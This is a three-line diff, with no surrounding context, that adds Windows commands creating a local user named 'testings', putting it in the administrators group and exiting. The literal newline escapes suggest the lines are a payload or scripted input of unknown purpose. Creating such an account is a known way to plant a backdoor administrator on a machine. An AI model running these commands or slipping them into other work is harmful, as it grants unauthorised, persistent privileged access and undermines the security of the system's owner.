@@ -1,0 +1,3 @@
+net user testings /add\n
+net localgroup "administrators" testings /add\n
+exit\n
